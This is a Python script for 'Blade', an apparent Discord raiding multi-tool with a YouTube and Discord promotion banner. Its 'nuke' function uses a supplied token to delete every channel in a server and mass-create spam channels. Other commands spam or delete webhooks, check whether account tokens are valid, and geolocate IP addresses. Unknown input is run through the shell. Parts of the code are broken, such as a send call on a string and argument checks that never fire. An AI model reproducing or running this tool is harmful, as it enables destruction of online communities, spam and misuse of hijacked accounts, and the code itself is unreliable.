import subprocess
import colorama
import os
from colorama import Fore, Style
import requests
from pystyle import Colorate, Colors


# change color here
color = Colors.purple_to_blue
def help():
  logo()
  print(Colorate.Horizontal(color, """                                         
   +---------------------------------------------------------------------
   ¦                    made by zocvz                       ¦ https://www.youtube.com/@latexfn  
   ¦  ______     __         ______     _____     ______   ¦
   ¦ /\  == \   /\ \       /\  __ \   /\  __-.  /\  ___\    ¦
   ¦ \ \  __<   \ \ \____  \ \  __ \  \ \ \/\ \ \ \  __\    ¦
   ¦  \ \_____\  \ \_____\  \ \_\ \_\  \ \____-  \ \_____\  ¦
   ¦   \/_____/   \/_____/   \/_/\/_/   \/____/   \/_____/  ¦
   ¦    /\                                                  ¦
   ¦   /  \     ipinfo <ip> - shows the ip info             ¦
   ¦   |  |     help - shows the this menu                  ¦
   ¦  ======    exit - exits the program                    ¦
   ¦    ||      webhook <link> <delete/message>             ¦
   ¦    ||      validate <token> - validates a token        ¦
   ¦  ------    nuke <token> <server id> <name of channels> ¦ https://discord.gg/Avdxh98Cth

   +---------------------------------------------------------------------

  """))







# Need to add
def search(target):
  return
# idk what u want me to put
def nuke(target, targetwo, targetthree, message, amount):
    logo()
    if not target or not targetwo or not targetthree:
        print(Colorate.Horizontal(color, "nuke <token> <server id> <name of channel> <message> <count>"))
        return

    import discord
    import asyncio

    async def start_nuke():
        client = discord.Client(intents=discord.Intents.all())

        @client.event
        async def on_ready():
            server = client.get_guild(int(targetwo))

            for channel in server.channels:
                await channel.delete()
                print(Colorate.Horizontal(color, f"Deleted {channel.name}"))

            for i in range(int(amount)):
                new_channel = await server.create_text_channel(name=f"{targetthree}-{i}")
                await message.send(message)
                print(Colorate.Horizontal(color, f"Created {new_channel.name}"))
                await asyncio.sleep(0.1)

            await client.close()

        await client.start(target)

    asyncio.run(start_nuke())
def webhook(target, targetwo, message, amount):
  logo()
  if targetwo == "delete":
    requests.delete(target)
    input(Colorate.Horizontal(color, f"Press enter to continue..."))
    main()

  else:
    for i in range(int(amount)):
     send =  requests.post(target, json={"content": message})
     if send.status_code == 204:
       print(Colorate.Horizontal(color, f'Status: {send.status_code} Sent "{message}" successfully ?'))
     elif send.status_code == 429:
      print(Colorate.Horizontal(color, f"Rate Limited with status: {send.status_code} ??"))
     else:
      print(Colorate.Horizontal(color, f"Error: status {send.status_code}  ?"))
     

def logo():
  print(Colorate.Horizontal(color, rf"""
   ______     __         ______     _____     ______
/\  == \   /\ \       /\  __ \   /\  __-.  /\  ___\
\ \  __<   \ \ \____  \ \  __ \  \ \ \/\ \ \ \  __\
 \ \_____\  \ \_____\  \ \_\ \_\  \ \____-  \ \_____\
  \/_____/   \/_____/   \/_/\/_/   \/____/   \/_____/
   /\
  /  \
  |  |
  |  |
 ======
   ||
   ||
 ------
  """))
def validate(target):
   logo()
   response = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": target})
   if response.status_code == 200:
     print(Colorate.Horizontal(color, f"Token is valid ?"))
   else:
     print(Colorate.Horizontal(color, f"Token is invalid ?"))

def ip_lookup(target):
   logo()
   response = requests.get(f"https://ipinfo.io/{target}/json")
   data = response.json()
   if response.status_code == 200:
       print(Colorate.Horizontal(color, f"-" * 80))
       print(Colorate.Horizontal(color, f'IP: {data["ip"]}'))
       print(Colorate.Horizontal(color, f'HOSTNAME: {data["hostname"]}'))
       print(Colorate.Horizontal(color, f'CITY: {data["city"]}'))
       print(Colorate.Horizontal(color, f'REGION: {data["region"]}'))
       print(Colorate.Horizontal(color, f'COUNTRY: {data["country"]}'))
       print(Colorate.Horizontal(color, f'LOC: {data["loc"]}'))
       print(Colorate.Horizontal(color, f'ORG: {data["org"]}'))
       print(Colorate.Horizontal(color, f'POSTAL: {data["postal"]}'))
       print(Colorate.Horizontal(color, f'TIMEZONE: {data["timezone"]}'))
       print(Colorate.Horizontal(color, f'ANYCAST: {data["anycast"]}'))
       print(Colorate.Horizontal(color, "-" * 80))
       input(Colorate.Horizontal(color, f"Press enter to continue..."))
   else:
       print(Fore.RED + f"Not found or invalid ip {target}")

def main():
    while True:
        try:
            help()
            print(f"{Colorate.Horizontal(color, f'     +-------')}")
            user =  input(f"{Colorate.Horizontal(color, f'     +-[$] ')}")
            args = user.split()
            command = args[0]
            target = args[1] if len(args) > 1 else None
            targetwo = args[2] if len(args) > 2 else None
            targetthree = args[3] if len(args) > 3 else None
            targetfour = args[4] if len(args) > 4 else None
            targetfive = args[5] if len(args) > 5 else None

            if command == "help":
                help()
                continue
            elif command.lower() in ["exit", "quit"]:
                break
            elif command == "ipinfo":
              ip_lookup(target)
              if target == "":
                print(Colorate.Horizontal(color, "ipinfo <ip>"))
                continue

            elif command == "nuke":
              if target == "" or targetwo == "" or targetthree == "":
                print(Colorate.Horizontal(color, "nuke <token> <server id> <channel name> <message> <amount of channels>"))
                continue
              message = input(Colorate.Horizontal(color, f"Message: "))
              amount = input(Colorate.Horizontal(color, f"Amount of channels: "))
              nuke(target,targetwo,targetthree,message,amount)
              continue
            elif command == "webhook":
              if target == "" or targetwo == "":
                print(Colorate.Horizontal(color, "webhook <link> <delete/message>"))
                continue
              if targetwo == "delete":
                webhook(target, targetwo, "", "")
                continue
              message = input(Colorate.Horizontal(color, f"Message: "))
              amount = input(Colorate.Horizontal(color, f"Amount: "))
              webhook(target, targetwo, message, amount)
              continue

            else:
              result = subprocess.run(command, shell=True, capture_output=True, text=True)
              if result.stdout:
                 print(result.stdout, end='')
                 continue
              if result.stderr:
                 print(result.stderr, end='')
                 continue

        except KeyboardInterrupt:
            print("\n(To exit, type 'exit' or 'quit')")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    main()
